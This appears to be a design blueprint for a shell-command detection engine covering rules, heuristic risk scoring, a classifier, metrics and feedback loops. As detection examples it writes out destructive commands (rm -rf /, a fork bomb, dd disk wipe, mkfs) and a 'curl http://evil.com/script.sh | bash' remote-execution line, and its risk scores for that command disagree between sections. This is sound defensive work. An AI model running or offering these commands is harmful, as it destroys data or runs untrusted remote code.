# CommandRisk Northstar — Security Detection Engine
## AI Security Portfolio + Operational Maturity

**Version:** 3.0 (Final Architect Blueprint)  
**Owner:** Michael  
**Date:** 2025-01-15  
**Status:** Authoritative — Ready for Implementation

---

## 0. Document Purpose & Authority

### 0.1 What This Document Is

This is the **definitive architectural blueprint** for CommandRisk, combining:
- **Detection Engineering** (rules, heuristics, ML classifier)
- **Security Operations** (MITRE ATT&CK, SOC outputs, TPR/FPR)
- **Operational Maturity** (monitoring, rule versioning, feedback loops)

**Audience:**
- **Architect (This Claude Project):** Design authority
- **Overseer (VSCode Claude):** Technical reviewer, spec refiner
- **Primary Engineer (Codex):** Implementation executor

---

### 0.2 What This Document Is NOT

❌ SOC operations manual (no 24/7 analyst workflows)  
❌ SIEM integration guide (no Splunk/QRadar/Sentinel)  
❌ Enterprise compliance framework (no SOC 2, no ISO 27001)  
❌ Threat intelligence platform (no IOC feeds, no TI correlation)

---

### 0.3 Design Principles

**Detection-First:**
- High precision (low false positives)
- Explainability (every detection has reason + MITRE mapping)
- Conservative (critical FPR ≈ 0%)

**Operational Maturity:**
- Rule versioning (Git-based)
- Detection quality tracking (TPR/FPR metrics)
- Continuous improvement (feedback → rule updates)

**Pragmatic Scope:**
- CLI tool (local analysis, EDR log processing)
- Basic metrics (detection rates, not enterprise dashboards)
- Portfolio quality (demonstrable skill, not production SOC)

---

## 1. Project Identity

### 1.1 Mission Statement

**Build a security detection engine that identifies malicious command patterns with high precision and full explainability.**

**Why it matters:**
- Demonstrates threat modeling skills (MITRE ATT&CK)
- Showcases detection engineering (rules, heuristics, ML)
- Proves operational thinking (metrics, versioning, improvement)

---

### 1.2 Success Definition

**CommandRisk succeeds when:**

**Detection Quality:**
- ✅ Critical TPR ≥ 90% (dangerous commands detected)
- ✅ Critical FPR ≈ 0% (benign commands passed)
- ✅ Evasion detection ≥ 80% (obfuscated variants)

**Explainability:**
- ✅ Every detection has rule ID + description
- ✅ Every detection has MITRE ATT&CK mapping
- ✅ Risk scores are consistent and justifiable

**Operational Quality:**
- ✅ Rules versioned in Git (full change history)
- ✅ Detection metrics tracked (TPR/FPR trends)
- ✅ Feedback loop operational (FP/FN → improvements)

---

### 1.3 Non-Goals (Out of Scope)

❌ Real-time EDR agent (offline analysis only)  
❌ SIEM integration (Splunk, QRadar, Sentinel)  
❌ SOAR platform integration (Demisto, Phantom)  
❌ Threat intelligence feeds (IOC enrichment)  
❌ 24/7 SOC analyst workflows  
❌ Insider threat profiling  
❌ Compliance reporting (PCI-DSS, HIPAA)

---

## 2. Detection Architecture

### 2.1 Three-Layer Defense

**Layer 1: Rule-Based Detection (Phase 1)**
- **Purpose:** High-confidence pattern matching
- **Method:** Deterministic regex rules
- **Output:** Binary (match/no-match) + rule ID + MITRE tactic

**Layer 2: Heuristic Scoring (Phase 2)**
- **Purpose:** Context-aware risk assessment
- **Method:** Feature scoring + context multipliers
- **Output:** Risk score (0-100) + risk level (safe/review/dangerous/critical)

**Layer 3: Semantic Classifier (Phase 3 - Optional)**
- **Purpose:** Catch evasion variants
- **Method:** Embedding-based similarity detection
- **Output:** Malicious probability + confidence score

**Integration:**
```
Command Input
    ↓
Rule Engine (Layer 1) → Match? → Flag + MITRE
    ↓ (no match or low-confidence)
Heuristic Scorer (Layer 2) → Risk Score → Risk Level
    ↓ (if ambiguous)
Semantic Classifier (Layer 3) → Similarity Score → Final Label
    ↓
Detection Output (JSONL, Markdown, CLI)
```

---

### 2.2 Rule-Based Detection (Phase 1)

#### Rule Design Principles

**Conservative by Design:**
- Critical FPR ≈ 0% (no false alarms on benign commands)
- High-confidence patterns only (e.g., `rm -rf /` is ALWAYS bad)
- Avoid overly broad patterns (e.g., don't flag all `curl` usage)

**MITRE ATT&CK Mapping:**
- Every rule maps to ≥1 tactic (e.g., T1485: Data Destruction)
- Every rule maps to ≥1 technique (e.g., T1070.004: File Deletion)
- Enables SOC triage and threat intelligence correlation

---

#### Rule Structure

**Rule Schema:**
```yaml
rule_id: "destructive_rm"
name: "Recursive Root Deletion"
description: "Detects attempts to recursively delete root filesystem"
severity: "critical"
pattern: "rm\\s+-[^\\s]*r[^\\s]*\\s+/"
mitre_tactics: ["TA0040: Impact"]
mitre_techniques: ["T1485: Data Destruction"]
references:
  - "https://attack.mitre.org/techniques/T1485/"
false_positive_mitigation: "None (always malicious)"
```

**Rule Categories:**
1. **File Operations** (deletion, modification, permissions)
2. **Network Operations** (exfiltration, C2 communication)
3. **Privilege Escalation** (sudo, setuid, chmod)
4. **Execution** (remote code, downloads, interpreters)
5. **Obfuscation** (encoding, unusual quoting)

---

#### Initial Rule Set (20-30 Rules)

**Critical Rules (Always Block):**
```
1. rm -rf / (recursive root deletion)
2. :(){ :|:& };: (fork bomb)
3. dd if=/dev/zero of=/dev/sda (disk wipe)
4. chmod -R 777 / (blanket permissions)
5. curl ... | bash (blind remote execution)
6. wget ... | sh (same)
7. mkfs.* /dev/sd* (format disk)
8. > /dev/sd* (direct disk write)
```

**High-Risk Rules (Flag for Review):**
```
9. rm -rf <any directory>
10. chmod 777 <any file>
11. sudo <any command>
12. nc -l <port> (listening netcat)
13. base64 encoded commands
14. eval $(curl ...)
```

---

#### Rule Testing Strategy

**Positive Tests (Malicious Commands):**
- Each rule has ≥5 positive test cases
- Covers variations (spaces, flags, ordering)
- Example: `rm -rf /` vs `rm -r -f /` vs `rm  -rf  /`

**Negative Tests (Benign Commands):**
- Each rule has ≥10 negative test cases
- Common false positive patterns
- Example: `rm -rf /tmp/test` (should NOT trigger root deletion rule)

---

### 2.3 Heuristic Scoring (Phase 2)

#### Scoring Strategy

**Base Risk Scores (0-100):**
```
Command Features:
- File deletion: +3
- Recursive flag (-r): +2
- Force flag (-f): +2
- Root directory (/): +10
- Network access (curl, wget): +3
- Pipe to shell (| bash, | sh): +5
- Sudo/privilege: +4
- Encoding (base64, xxd): +3
```

**Context Multipliers (1.0-3.0x):**
```
User Context:
- Root/admin user: ×1.5
- Non-privileged user: ×1.0
- Service account: ×1.2

Host Context:
- Production server: ×2.0
- Critical asset: ×3.0
- Development machine: ×1.0

Time Context:
- Business hours (9am-5pm): ×1.0
- Off-hours (5pm-9am): ×1.5
- Weekend: ×1.3

Directory Context:
- /tmp or /var/tmp: ×1.2
- User home directory: ×1.0
- System directories (/etc, /usr, /bin): ×1.5
```

**Final Risk Score:**
```
Final Score = Base Score × Context Multipliers

Risk Level:
- 0-29: Safe (log only)
- 30-59: Review (alert low priority)
- 60-84: Dangerous (alert high priority)
- 85-100: Critical (immediate escalation)
```

---

#### Example Scoring

**Command: `curl http://evil.com/script.sh | bash`**

**Base Score:**
```
- Network access (curl): +3
- Pipe to bash: +5
- Suspicious domain: +4
Total: 12 points
```

**Context:**
```
- Executed at 3am: ×1.5
- By non-admin user: ×1.0
- In /tmp directory: ×1.2
Total Multiplier: 1.8
```

**Final Score:**
```
12 × 1.8 = 21.6 → Safe (borderline)

With Critical Asset Multiplier (×3.0):
12 × 1.8 × 3.0 = 64.8 → Dangerous
```

---

### 2.4 Semantic Classifier (Phase 3 - Optional)

#### Purpose

**Catch evasion variants:**
- Obfuscated commands: `r""m -rf /` vs `\r\m -rf /`
- Encoding tricks: base64, hex, unicode
- Whitespace manipulation: `rm   -rf   /`
- Alias usage: `alias rr='rm -rf'`

---

#### Architecture

**Embedding Model:**
- Sentence-BERT or CodeBERT (small, efficient)
- Embed command into 768-dim vector
- Compute cosine similarity to known malicious patterns

**Training Data:**
```
Malicious Set: 500+ dangerous commands + variants
Benign Set: 5,000+ normal commands

Augmentation:
- Generate obfuscated variants (20 per malicious command)
- Whitespace manipulation
- Encoding (base64, hex)
- Alias substitution
```

**Classification:**
```
Similarity Threshold: 0.85
If cosine_similarity(command_embedding, malicious_pattern) > 0.85:
    → Flag as malicious
    → Provide closest malicious pattern (for explanation)
```

---

#### Success Criteria

**Evasion Set Performance:**
- 100 obfuscated dangerous commands
- Expected TPR ≥ 80%
- Expected FPR ≈ 0% (on benign variants)

---

## 3. Operational Architecture

### 3.1 Rule Management

#### Rule Versioning

**Git-Based Version Control:**
```
commandrisk/
├── rules/
│   ├── file_operations.yaml     # File-related rules
│   ├── network_operations.yaml  # Network-related rules
│   ├── privilege_escalation.yaml
│   ├── execution.yaml
│   └── obfuscation.yaml
├── CHANGELOG.md                 # Rule change history
└── tests/
    ├── test_file_operations.py
    └── test_network_operations.py
```

**Semantic Versioning:**
```
v1.0.0: Initial rule set (20 rules)
v1.1.0: Added 5 new rules (network exfiltration)
v1.1.1: Fixed false positive in destructive_rm rule
v2.0.0: Major refactor (context multipliers added)
```

---

#### Rule Lifecycle

**Draft → Review → Test → Deploy → Monitor → Retire**

**1. Draft:**
- Security engineer writes rule (YAML format)
- Includes: pattern, severity, MITRE mapping, test cases

**2. Review:**
- Peer review (2+ engineers)
- Check: pattern correctness, false positive potential, MITRE accuracy

**3. Test:**
- Run positive tests (malicious commands)
- Run negative tests (benign commands)
- Verify TPR ≥ 90%, FPR ≈ 0%

**4. Deploy:**
- Merge to main branch (Git)
- Hot-reload (no downtime)
- Log deployment event

**5. Monitor:**
- Track rule hit rate (how often triggered)
- Track false positive rate (user disputes)
- Weekly review of rule effectiveness

**6. Retire:**
- Low-value rules (never triggered in 6 months)
- Replaced by better rules
- Archived in Git history

---

### 3.2 Detection Quality Metrics

#### Core Metrics

**True Positive Rate (TPR):**
```
TPR = Correctly Detected Dangerous Commands / Total Dangerous Commands
Target: ≥ 90% (critical commands)
```

**False Positive Rate (FPR):**
```
FPR = Incorrectly Flagged Benign Commands / Total Benign Commands
Target: ≈ 0% (critical FPR)
```

**Precision:**
```
Precision = True Positives / (True Positives + False Positives)
Target: ≥ 95%
```

**F1 Score:**
```
F1 = 2 × (Precision × Recall) / (Precision + Recall)
Target: ≥ 90%
```

---

#### Metric Tracking

**Weekly Evaluation:**
- Run detection engine on test set (500 dangerous, 5,000 benign)
- Calculate TPR, FPR, Precision, F1
- Compare vs previous week (detect degradation)
- Log results to `evaluation/metrics_YYYY-MM-DD.json`

**Trend Analysis:**
```python
class DetectionMetrics:
    date: datetime
    tpr: float
    fpr: float
    precision: float
    f1: float
    rule_count: int
    avg_risk_score: float
```

**Alerting:**
- If TPR drops >5%: investigate (rule gap? evasion?)
- If FPR increases >2%: investigate (overly broad rule?)
- If F1 drops >5%: retune thresholds

---

### 3.3 Feedback Loop

#### Feedback Collection

**1. False Positive Reports (User-Disputed):**
```python
class FalsePositiveReport:
    command: str
    rule_triggered: str
    user_justification: str
    timestamp: datetime
```

**Action:**
- Review rule logic
- Add negative test case
- Tighten rule pattern (reduce FPR)
- Document fix in CHANGELOG.md

---

**2. False Negative Reports (Missed Detections):**
```python
class FalseNegativeReport:
    command: str
    expected_rule: str
    why_missed: str
    timestamp: datetime
```

**Action:**
- Add new rule or extend existing rule
- Add positive test case
- Verify detection on evasion set
- Deploy updated rule

---

**3. Automated Logging:**
```python
class DetectionLog:
    command_hash: str  # SHA256 (privacy)
    risk_level: str
    rules_triggered: List[str]
    mitre_tactics: List[str]
    context: Dict[str, Any]
    timestamp: datetime
```

**Action:**
- Weekly aggregation (most frequent detections)
- Identify anomalies (spike in specific rule)
- Validate rule effectiveness (hit rate vs FPR)

---

#### Feedback → Action Pipeline

```
Feedback Event (FP or FN)
    ↓
Logged to feedback.jsonl
    ↓
Weekly Review Meeting (30 minutes)
    ↓
Categorize: Rule Gap / Overly Broad / Evasion
    ↓
Fix Rule (update pattern, add test case)
    ↓
Peer Review → Test → Deploy
    ↓
Re-evaluate on Test Set
    ↓
Monitor for Improvement
```

---

### 3.4 Output Formats

#### JSONL (Machine-Readable)

**Detection Output:**
```json
{
  "command": "rm -rf /tmp/test",
  "risk_level": "dangerous",
  "risk_score": 65,
  "rules_triggered": [
    {
      "rule_id": "destructive_rm_tmp",
      "severity": "high",
      "description": "Recursive deletion in /tmp"
    }
  ],
  "mitre_tactics": ["TA0040: Impact"],
  "mitre_techniques": ["T1485: Data Destruction"],
  "context": {
    "user": "admin",
    "host": "prod-server",
    "timestamp": "2025-01-15T10:30:00Z"
  },
  "explanation": "Recursive deletion detected with force flag"
}
```

---

#### Markdown (Human-Readable Report)

**Daily Detection Summary:**
```markdown
# CommandRisk Detection Report
**Date:** 2025-01-15
**Commands Analyzed:** 1,234

## Summary
- **Critical:** 3 detections
- **Dangerous:** 12 detections
- **Review:** 45 detections
- **Safe:** 1,174 commands

## Top MITRE Tactics
1. Impact (15 detections)
2. Privilege Escalation (8 detections)
3. Execution (6 detections)

## Top Triggered Rules
1. `destructive_rm` (8 times)
2. `privilege_sudo` (6 times)
3. `network_exfiltration` (4 times)

## Critical Detections
### 1. rm -rf / (CRITICAL)
- **User:** admin
- **Host:** prod-server
- **Time:** 10:30 AM
- **MITRE:** T1485 (Data Destruction)
- **Action:** Blocked

[... additional critical detections ...]
```

---

#### CLI Output (Interactive)

**Command:**
```bash
commandrisk analyze "curl http://evil.com | bash"
```

**Output:**
```
⚠️  DANGEROUS COMMAND DETECTED

Command: curl http://evil.com | bash
Risk Level: DANGEROUS (score: 72)

Rules Triggered:
  [CRITICAL] network_remote_execution
    Description: Remote script execution via curl/wget pipe
    MITRE: T1059.004 (Command and Scripting Interpreter: Unix Shell)

Context Factors:
  • Network access: curl (+3 points)
  • Pipe to shell: | bash (+5 points)
  • Suspicious domain: evil.com (+4 points)
  • Off-hours execution: 3am (×1.5 multiplier)

Recommendation: BLOCK and investigate source of command
```

---

## 4. Integration with CLI-Tuner (Optional Phase 4)

### 4.1 Post-Generation Validation

**Workflow:**
```python
# CLI-Tuner generates command
instruction = "Delete all temporary files"
command = cli_tuner.generate(instruction)

# CommandRisk validates
assessment = commandrisk.analyze(command)

if assessment["risk_level"] in ["dangerous", "critical"]:
    return {
        "command": None,
        "error": "Generated command flagged as dangerous",
        "reason": assessment["explanation"],
        "mitre_tactics": assessment["mitre_tactics"]
    }
else:
    return {
        "command": command,
        "safe": True,
        "risk_score": assessment["risk_score"]
    }
```

---

### 4.2 Pre-Generation Guidelines (Future)

**CommandRisk provides safe patterns:**
```python
# CLI-Tuner queries CommandRisk before generation
safe_patterns = commandrisk.get_safe_guidelines()

# CLI-Tuner biases generation toward safe patterns
prompt = f"""
Generate a Bash command for: {instruction}

Safety Guidelines:
- Avoid: {safe_patterns['avoid']}
- Prefer: {safe_patterns['prefer']}
"""
```

---

### 4.3 Feedback Loop Integration

**CommandRisk logs all CLI-Tuner outputs:**
```python
class CLITunerDetection:
    request_id: str
    instruction: str
    command_generated: str
    risk_level: str
    rules_triggered: List[str]
    user_accepted: bool  # Did user run the command?
```

**Action:**
- False negatives (dangerous commands passed) → retrain CLI-Tuner
- High-risk patterns → add to CLI-Tuner guardrails
- User disputes → improve both systems

---

## 5. Project Timeline & Phases

### Phase 1: Rule-Based Detection (Weeks 1-2)

**Deliverables:**
- [ ] 20-30 high-confidence rules (YAML format)
- [ ] MITRE ATT&CK mappings (all rules)
- [ ] Rule engine (pattern matching logic)
- [ ] Test sets (benign + malicious)
- [ ] CLI tool (`commandrisk analyze <command>`)
- [ ] JSONL output format

**Success Gate:** Critical FPR ≈ 0%, Critical TPR ≥ 90%

---

### Phase 2: Heuristic Scoring (Weeks 2-3)

**Deliverables:**
- [ ] Scoring rubric (base scores + context multipliers)
- [ ] Risk calculation engine
- [ ] Threshold tuning (validation set)
- [ ] Context awareness (time, user, directory)
- [ ] Markdown report generator

**Success Gate:** Suspicious/Malicious detection ≥ 80% without FP spike

---

### Phase 3: Semantic Classifier (Week 4 - Optional)

**Deliverables:**
- [ ] Embedding model (sentence-transformers)
- [ ] Evasion test set (100 obfuscated commands)
- [ ] Classifier training/fine-tuning
- [ ] Integration with rules + heuristics

**Success Gate:** Evasion set TPR ≥ 80%, benign FPR ≈ 0%

---

### Phase 4: CLI-Tuner Integration (Week 5 - Optional)

**Deliverables:**
- [ ] Post-generation validation workflow
- [ ] Integration testing (CLI-Tuner + CommandRisk)
- [ ] Documentation (`docs/integration.md`)

**Success Gate:** Dangerous CLI-Tuner outputs blocked before user sees

---

## 6. Success Criteria Summary

### Detection Quality
- ✅ Critical TPR ≥ 90% (dangerous commands detected)
- ✅ Critical FPR ≈ 0% (benign commands passed)
- ✅ Evasion TPR ≥ 80% (obfuscated variants detected)
- ✅ Every detection explainable (rule ID + MITRE tactic)

### Operational Quality
- ✅ Rules versioned in Git (full history)
- ✅ Metrics tracked weekly (TPR, FPR, Precision, F1)
- ✅ Feedback loop operational (FP/FN → improvements)
- ✅ Rule lifecycle managed (draft → deploy → retire)

### Portfolio Quality
- ✅ CLI tool functional (`commandrisk analyze`)
- ✅ Multiple output formats (JSONL, Markdown, CLI)
- ✅ MITRE ATT&CK coverage matrix
- ✅ Evaluation framework (test sets, metrics, reports)

---

## 7. Repository Structure

```
commandrisk/
├── .github/
│   └── workflows/
│       └── test.yml           # CI/CD (rule tests)
├── rules/
│   ├── file_operations.yaml
│   ├── network_operations.yaml
│   ├── privilege_escalation.yaml
│   ├── execution.yaml
│   └── obfuscation.yaml
├── engine/
│   ├── rules.py               # Rule matching logic
│   ├── scoring.py             # Heuristic scoring
│   └── semantic.py            # ML classifier (optional)
├── cli.py                     # CLI interface
├── evaluation/
│   ├── test_benign.json       # 5,000 benign commands
│   ├── test_malicious.json    # 500 dangerous commands
│   ├── test_evasion.json      # 100 obfuscated commands
│   └── metrics/               # Weekly TPR/FPR tracking
├── monitoring/
│   ├── logs/                  # Detection logs (JSONL)
│   └── feedback/              # FP/FN reports
├── docs/
│   ├── NORTHSTAR.md           # This document
│   ├── RULES.md               # Rule documentation
│   ├── MITRE_MAPPING.md       # ATT&CK coverage
│   └── EVALUATION.md          # Metrics, results
└── README.md                  # Project overview
```

---

## 8. Handoff to Overseer

**Overseer Role:**
1. Review this Northstar for technical correctness
2. Refine rule patterns (avoid false positives)
3. Create implementation-ready specs for each phase
4. Validate Primary Engineer's code against specs

**Handoff Checklist:**
- [ ] Northstar reviewed and approved
- [ ] Phase 1 spec prepared (rule-based detection)
- [ ] Phase 2 spec prepared (heuristic scoring)
- [ ] Phase 3 spec prepared (semantic classifier - optional)
- [ ] Phase 4 spec prepared (CLI-Tuner integration - optional)

---

## 9. Status

**Document Status:** ✅ FINAL — Ready for Implementation

**What's Locked:**
- ✅ Three-layer architecture (rules → heuristics → ML)
- ✅ Detection quality targets (TPR ≥90%, FPR ≈0%)
- ✅ MITRE ATT&CK mapping (all rules)
- ✅ Operational architecture (versioning, metrics, feedback)
- ✅ Output formats (JSONL, Markdown, CLI)

**Next Step:** Pass to Overseer for Phase 1 implementation spec.

---

**END OF COMMANDRISK NORTHSTAR — SECURITY DETECTION ENGINE**
